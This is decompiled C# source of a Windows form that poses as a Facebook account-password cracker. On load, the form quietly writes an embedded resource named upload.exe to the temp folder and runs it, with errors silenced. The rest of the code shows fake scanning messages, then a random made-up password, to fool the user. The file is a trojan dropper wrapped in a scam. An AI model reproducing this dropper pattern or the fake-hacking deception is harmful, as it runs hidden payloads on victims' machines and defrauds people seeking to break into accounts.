		((Control)ReactorTheme1).PerformLayout();
		((Control)ReactorGroupBox1).ResumeLayout(false);
		((Control)ReactorGroupBox1).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form2_FormClosed(object sender, FormClosedEventArgs e)
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				case 40:
				{
					num2 = num;
					if (num3 > -2)
					{
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
					}
					int num4 = num2 + 1;
					num2 = 0;
					switch (num4)
					{
					case 1:
						break;
					default:
						goto end_IL_0001;
					case 2:
						goto end_IL_0001_2;
					}
					break;
				}
				}
				ProjectData.ClearProjectError();
				num3 = -2;
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 40;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		((Control)PictureBox2).Hide();
		((Control)PictureBox1).Show();
		try
		{
			string temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
			string text = temp + "upload.exe";
			File.WriteAllBytes(text, Resources.upload);
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ReactorButton1_Click(object sender, EventArgs e)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 191:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0022;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_0035;
						case 7:
							goto IL_0043;
						case 8:
							goto IL_0051;
						case 9:
							goto IL_005e;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 11:
						case 12:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_005e:
					num = 9;
					((Control)PictureBox2).Show();
					break;
					IL_0051:
					num = 8;
					((Control)PictureBox1).Hide();
					goto IL_005e;
					IL_0009:
					num = 2;
					if (Operators.CompareString(((Control)ReactorTextBox1).get_Text(), (string)null, false) == 0)
					{
						goto IL_0022;
					}
					goto IL_0033;
					IL_0022:
					num = 3;
					Interaction.MsgBox((object)"Please Enter Email !!", (MsgBoxStyle)0, (object)null);
					goto end_IL_0001_3;
					IL_0033:
					num = 5;
					goto IL_0035;
					IL_0035:
					num = 6;
					((Control)ReactorButton1).set_Enabled(false);
					goto IL_0043;
					IL_0043:
					num = 7;
					((Control)ReactorTextBox1).set_Enabled(false);
					goto IL_0051;
					end_IL_0001_2:
					break;
				}
				num = 10;
				Timer2.Start();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 191;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 125:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0039;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0039:
					num = 4;
					Timer3.Start();
					break;
					IL_0021:
					num = 3;
					ListBox1.get_Items().Add((object)"watting for scan ...");
					goto IL_0039;
					IL_0009:
					num = 2;
					ListBox1.get_Items().Add((object)"Scan for Facebook profile >>");
					goto IL_0021;
					end_IL_0001_2:
					break;
				}
				num = 5;
				Timer2.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 125;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 125:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0039;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0039:
					num = 4;
					Timer4.Start();
					break;
					IL_0021:
					num = 3;
					ListBox1.get_Items().Add((object)"cutting draw and build.");
					goto IL_0039;
					IL_0009:
					num = 2;
					ListBox1.get_Items().Add((object)"use port in 4444");
					goto IL_0021;
					end_IL_0001_2:
					break;
				}
				num = 5;
				Timer3.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 125;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 125:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0039;
						case 5:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0039:
					num = 4;
					Timer5.Start();
					break;
					IL_0021:
					num = 3;
					ListBox1.get_Items().Add((object)"watting for regedit");
					goto IL_0039;
					IL_0009:
					num = 2;
					ListBox1.get_Items().Add((object)"delete loges and build");
					goto IL_0021;
					end_IL_0001_2:
					break;
				}
				num = 5;
				Timer4.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 125;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 181:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_0051;
						case 6:
							goto IL_0069;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0069:
					num = 6;
					Timer6.Start();
					break;
					IL_0051:
					num = 5;
					ListBox1.get_Items().Add((object)"file man drawer");
					goto IL_0069;
					IL_0009:
					num = 2;
					ListBox1.get_Items().Add((object)"allow sniffer");
					goto IL_0021;
					IL_0021:
					num = 3;
					ListBox1.get_Items().Add((object)"put email to cathe and get");
					goto IL_0039;
					IL_0039:
					num = 4;
					ListBox1.get_Items().Add((object)"succes build ");
					goto IL_0051;
					end_IL_0001_2:
					break;
				}
				num = 7;
				Timer5.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 181;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 153:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_0051;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0051:
					num = 5;
					Timer7.Start();
					break;
					IL_0039:
					num = 4;
					ListBox1.get_Items().Add((object)"sucsefily bulid and crut");
					goto IL_0051;
					IL_0009:
					num = 2;
					ListBox1.get_Items().Add((object)"need allow for firewall");
					goto IL_0021;
					IL_0021:
					num = 3;
					ListBox1.get_Items().Add((object)"sacning drag and fucheing");
					goto IL_0039;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Timer6.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 153;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		Timer1.Stop();
		Timer2.Stop();
		Timer3.Stop();
		Timer4.Stop();
		Timer5.Stop();
		try
		{
			Random random = new Random();
			switch (checked((short)random.Next(0, 3)))
			{
			case 0:
				TextBox1.set_Text("AQ123456");
				break;
			case 1:
				TextBox1.set_Text("123AA11233");
				break;
			case 2:
				TextBox1.set_Text("98761jsan");
				break;
			case 3:
				TextBox1.set_Text("muneer1920");
				break;
			case 4:
				TextBox1.set_Text("bloackwn22");
				break;
			case 5:
				TextBox1.set_Text("iraq20031");
				break;
			case 6:
				TextBox1.set_Text("mousel223");
				break;
			case 7:
				TextBox1.set_Text("ameerioo001");
				break;
			case 8:
				TextBox1.set_Text("33mn1234567");
				break;
			case 9:
				TextBox1.set_Text("nj991234567");
				break;
			case 10:
				TextBox1.set_Text("admin11amin");
				break;
			case 11:
				TextBox1.set_Text("333@@iraee");
				break;
			case 12:
				TextBox1.set_Text("fred1993no");
				break;
			case 13:
				TextBox1.set_Text("blail992013");
				break;
			case 14:
				TextBox1.set_Text("yosudi#11");
				break;
			case 15:
				TextBox1.set_Text("ahmed9812");
				break;
			case 16:
				TextBox1.set_Text("ktrarar$22");
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		((Control)ReactorButton1).set_Enabled(true);
		((Control)ReactorTextBox1).set_Enabled(true);
		Timer6.Stop();
		Timer7.Stop();
		((Control)PictureBox2).Hide();
		((Control)PictureBox1).Show();
	}

	private void ReactorTheme1_Click(object sender, EventArgs e)
	{
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
	}
}
